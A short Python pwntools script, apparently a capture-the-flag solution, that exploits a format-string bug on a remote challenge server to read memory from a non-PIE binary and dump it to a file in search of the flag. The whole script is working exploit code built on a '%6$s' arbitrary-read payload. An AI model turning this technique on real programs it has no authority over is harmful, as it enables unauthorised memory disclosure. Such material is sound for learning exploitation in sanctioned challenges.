#!/usr/bin/env python2

from pwn import *

HOST, PORT = "challs.xmas.htsp.ro", 1343
context.log_level = 'critical'

base = 0x08048000 # base addr of 32 bit binaries without PIE

while True:
    leak = "" # Set leak to an empty string
    with open("output.raw", "a") as f:
        p = remote(HOST, PORT)
        p.sendlineafter(':', '%6$s') # (base + len(leak)) is at offset 6, so %6$s is used
        p.sendlineafter(':', 'AA' + p32(base + len(leak))) # Padding required to place the address right
        leak = p.recvuntil('does')[:-5] + '\x00' # Must add NULL byte otherwise printf will hang
        p.close()

        # Must also replace newlines with \x00, it will cause the binary to be slightly corrupted
        # which doesn't matter because the flag is in the .bss segment for this binary
        if '\n' in leak:
            leak = "\x00"

        # Write to file
        f.write(leak)
        print leak.encode('hex') + " @ " + hex(base)
        base += len(leak)